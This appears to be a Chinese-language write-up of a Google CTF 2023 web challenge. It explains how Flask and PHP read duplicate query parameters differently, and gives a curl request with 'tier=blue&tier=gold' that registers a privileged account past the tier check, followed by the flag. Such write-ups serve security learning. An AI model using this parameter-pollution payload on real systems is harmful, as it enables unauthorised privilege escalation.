# UNDER-CONSTRUCTION

*We were building a web app but the new CEO wants it remade in php.*

*[Attachment](https://storage.googleapis.com/gctf-2023-attachments-project/22790c2f38bd6adde75753641011c223db7e2c0ec718df6e883976ed9c518ca0a86ef67b7e153fd07a9fa734f6a5350028ca266e3bf646f1096d2c4d536ff45a.zip)*
*`https://under-construction-web.2023.ctfcompetition.com`*
*`https://under-construction-php-web.2023.ctfcompetition.com`*

---

题目提供了Flask和PHP两个站点,用户可以在Flask站点进行注册,注册的账号可以同时用于登录Flask和PHP两个站点.

分析代码:

Flask会将HTTP请求原始查询参数转发到PHP应用程序中完成用户注册.

```python
# File: /flask/authorized_routes.py
@authorized.route('/signup', methods=['POST'])
def signup_post():
    raw_request = request.get_data()
    ...
    requests.post(f"http://{PHP_HOST}:1337/account_migrator.php", 
        headers={"token": TOKEN, "content-type": request.headers.get("content-type")}, data=raw_request)
    return redirect(url_for('authorized.login'))
```

只有`gold`级别的用户,在PHP站点登录后才可以看到FLAG

```php
# File: /php/index.php
function getResponse()
{
    ...
    $response = "Login successful. Welcome " . htmlspecialchars($username) . ".";

    if ($tier === "gold") {
        $response .= " " . getenv("FLAG");
    }

    return $response;
}
```

Flask会对查询参数进行校验,防止创建高权限的用户.

```python
# File: /flask/authorized_routes.py
@authorized.route('/signup', methods=['POST'])
def signup_post():
    ...
    tier = models.Tier(request.form.get('tier'))
    if(tier == models.Tier.GOLD):
        flash('GOLD tier only allowed for the CEO')
        return redirect(url_for('authorized.signup'))
    ...
```

HTTP查询参数中存在重复的key时,在Flask和PHP有不同的行为,flask会取第一个值,而PHP会取最后一个值.

因此我们可以构造如下命令,以此绕过Flask对查询参数的校验,并在PHP中注册高权限用户.

**curl**

```shell
curl -X POST https://under-construction-web.2023.ctfcompetition.com/signup -d "username=admin&password=admin&tier=blue&tier=gold"
```

然后用上述的用户名和密码去PHP站点登录即可.

**flag**: `CTF{ff79e2741f21abd77dc48f17bab64c3d}`
